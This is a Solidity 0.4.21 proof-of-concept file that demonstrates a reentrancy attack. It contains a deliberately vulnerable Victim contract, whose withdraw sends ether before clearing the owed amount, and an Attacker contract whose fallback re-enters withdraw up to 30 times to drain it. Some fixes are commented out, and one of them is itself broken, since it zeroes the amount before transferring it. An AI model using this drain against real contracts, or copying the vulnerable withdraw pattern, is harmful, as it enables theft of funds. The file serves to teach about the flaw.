pragma solidity 0.4.21;

contract Mutex {

    bool private mutex_lock = false;

    modifier checkMutex() {
        require(!mutex_lock);
        mutex_lock = true;
        _;
        mutex_lock = false;
    }

}

// code from https://ethereum.stackexchange.com/a/28963

contract Victim is Mutex {

    uint public owedToAttacker;
    address victimAddress = this;  // this.balance will be deprecated from 0.4.21
    // or address(this).balance

    event Logging(address);
    event Logging(uint);

    function Victim() public {
        owedToAttacker = 11;
    }

    // function withdraw() public checkMutex {
    function withdraw() public  {
        // // vulnerable code ( Proof of Concept for ReEntrancy Attack)
        if (!msg.sender.call.value(owedToAttacker)()) revert();
        owedToAttacker = 0;

        // // solution 1 
        // uint valueForWithdraw = owedToAttacker;
        // owedToAttacker = 0;
        // if (!msg.sender.call.value(valueForWithdraw)()) revert(); 
        // // // //

        // // solution 2
        // require(victimAddress.balance >= owedToAttacker);
        // owedToAttacker = 0;
        // msg.sender.transfer(owedToAttacker);
        // // // //

        // // solution 3
        // require(owedToAttacker >= address(this).balance);
        // if (msg.sender.send(owedToAttacker)) {
        //     owedToAttacker = 0;
        // }
        // // // //

    }

    function returnMsgSender() public view returns(address) {
        return msg.sender;
    }

    function returnThisAddress() public view returns(address) {
        return this;
    }

    function setOweToAttacker(uint _a) public {
        owedToAttacker = _a;
    }

    // deposit some funds for testing
    function deposit() public payable {}

    function getBalance() public constant returns(uint) { return victimAddress.balance; }
}

contract Attacker {

    Victim v;
    uint public count;

    address thisAddress = this;

    event LogFallback(uint count, uint balance);
    event LogFallback(uint count, uint balance, uint a);


    function Attacker(address victim) public payable {
        v = Victim(victim);
    }

    function viewVictim() public view returns(Victim) {
        return v;
    }



    function attack() public {
        v.withdraw();
    }

    function () public payable {
        count++;
        emit LogFallback(count, thisAddress.balance);
        // crude stop before we run out of gas
        if(count < 30) v.withdraw();
    }

    function test() public returns(uint, uint, uint) {
        count++;
        uint a;
        emit LogFallback(count, thisAddress.balance, a);
        // crude stop before we run out of gas
        if(count < 30){
            // v.withdraw();
            a++;
        }
        return (count, thisAddress.balance, a);
    }

    function setCount(uint _count) public {
        count = _count;
    }

    function callReturnMsgSender() view public returns(address) {
        return v.returnMsgSender();
    }

    function callReturnThisAddress() view public returns(address) {
        return v.returnThisAddress();
    }

    function getBalance() public constant returns(uint) { return thisAddress.balance; }

}